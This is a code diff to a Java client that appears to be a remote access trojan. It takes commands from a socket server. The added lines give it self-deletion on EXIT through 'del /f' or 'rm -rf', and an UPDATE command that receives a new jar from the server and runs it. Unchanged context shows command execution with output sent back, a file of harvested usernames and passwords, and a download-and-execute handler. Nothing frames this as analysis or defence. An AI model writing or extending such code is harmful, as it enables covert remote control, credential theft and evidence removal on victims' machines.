@@ -246,7 +246,11 @@ public class Client {
                 } else if (input.contains("EXIT")) {
                     communicate("EXIT");
                     File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
-                    f.deleteOnExit();
+                    if (SYSTEMOS.contains("wind")){
+                        Process proc = Runtime.getRuntime().exec("del /f " + f.getAbsolutePath());
+                    } else {
+                        Process proc = Runtime.getRuntime().exec("rm -rf " + f.getAbsolutePath());
+                    }
                     socket.close();
                     System.exit(0);
                 } else if (input.contains("PSHURL")) {
@@ -282,6 +286,7 @@ public class Client {
                     // For some reason, the lines are being truncated at around 117-120 char mark, completely cutting off most usernames and passwords
 
                     File outFile = new File(System.getProperty("java.io.tmpdir") + "GCDout.csv");
+                    outFile.createNewFile();
                     ProcessBuilder builder = new ProcessBuilder(cmd.split(" "));
                     builder.redirectErrorStream(true);
                     Process proc = builder.start();
@@ -293,7 +298,27 @@ public class Client {
                         System.out.println("Got line: " + s);
                     }
                     communicate("ENDPSH");
-                } else if (input.contains("DAE")){
+                } else if (input.equals("UPDATE")){
+                    long len = dis.readLong();
+                    String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".jar";
+                    File newClientFile = new File(fname);
+                    if (debugMode){ System.out.println("Update client saved to: " + fname); }
+                    FileOutputStream fos = new FileOutputStream(newClientFile);
+                    BufferedOutputStream bos = new BufferedOutputStream(fos);
+                    for (int j = 0; j < len; j++) bos.write(dis.readInt());
+                    bos.close();
+                    fos.close();
+                    // streams closed, shut down current connections and start up new client
+                    dos.close();
+                    dis.close();
+                    socket.close();
+
+                    // Start new client
+                    Process proc = Runtime.getRuntime().exec("java -jar " + fname);
+                    if (debugMode) { System.out.println("Exiting"); }
+                    System.exit(0);
+
+                } else if (input.equals("DAE")){
                     communicate("DAE");
                     String url = input.split(" ")[1];
                     String fname = randTextAlpha(8);
